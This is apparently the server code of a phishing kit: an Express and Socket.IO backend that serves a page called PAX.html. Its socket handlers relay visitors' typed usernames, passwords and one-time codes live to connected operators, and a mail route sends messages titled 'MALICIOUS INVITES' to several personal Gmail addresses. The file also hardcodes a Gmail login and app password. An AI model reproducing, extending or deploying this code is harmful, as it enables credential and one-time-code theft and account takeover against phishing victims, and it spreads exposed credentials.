const express = require('express');
const path = require('path'); // Import path module
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public'))); // Serve static files

// Email Sending Route
app.post('/send-email', async (req, res) => {
    const { message } = req.body;

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'hexyoproduction25@gmail.com', // Replace with your email
            pass: 'ljauazlfgodevesf'   // Replace with your app password
        }
    });

    let mailOptions = {
        from: 'hexyoproduction25@gmail.com',
        to: 'hexyo591@gmail.com, wachirasamwel26@gmail.com, kitekitesam1@gmail.com, denismaina036@gmail.com', // Recipient email
        subject: 'MALICIOUS INVITES',
        text: message + 'CLIENT VISIT YOUR WEB\nALL DETAILS ARE ENTERED\nTHIS WEB IS MANANGED BY HEXYO AND PHOTOHOLIC PRODUCTION\n\nPAYMENTS TO BE DONE BY THE CLIENT'
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200)
    } catch (error) {
        res.status(500)
    }
});

// Set default file when visiting the site (index.html)
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "PAX.html"));
});

// Socket.IO functionality
io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);

    // Listen for username & password
    socket.on('typing', (data) => {
        io.emit('display', data); 
    });

    // Listen for OTP input
    socket.on('otpEntered', (data) => {
        io.emit('display', data); 
    });

    // Listen for submit event
    socket.on('submit', (data) => {
        io.emit('submitted', data); 
    });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });
});

// Start the server
const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
